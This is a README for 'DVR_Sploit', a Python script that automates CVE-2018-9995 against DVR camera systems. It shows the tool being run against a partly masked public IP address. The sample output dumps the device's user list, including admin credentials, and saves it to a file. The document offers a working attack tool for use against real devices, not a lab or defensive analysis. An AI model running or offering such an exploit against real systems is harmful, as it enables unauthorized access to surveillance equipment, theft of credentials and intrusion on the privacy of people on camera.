# DVR_Sploit
Simple python3 script to automate CVE-2018-9995

Requirements: requests (pip install requests)

Usage:
root@fuckmachine:~# python3 dvrsploit.py            
Enter DVR host: 81.215.xxx.xxx
Enter DVR port: 88
Output:
Device list:
{"result":0,"list":[{"uid":"admin","pwd":"","role":2,"enmac":0,"mac":"00:00:00:00:00:00","playback":4294967295,"view":4294967295,"rview":4294967295,"ptz":4294967295,"backup":4294967295,"opt":4294967295}]}
Device list appended to dvr_output.txt
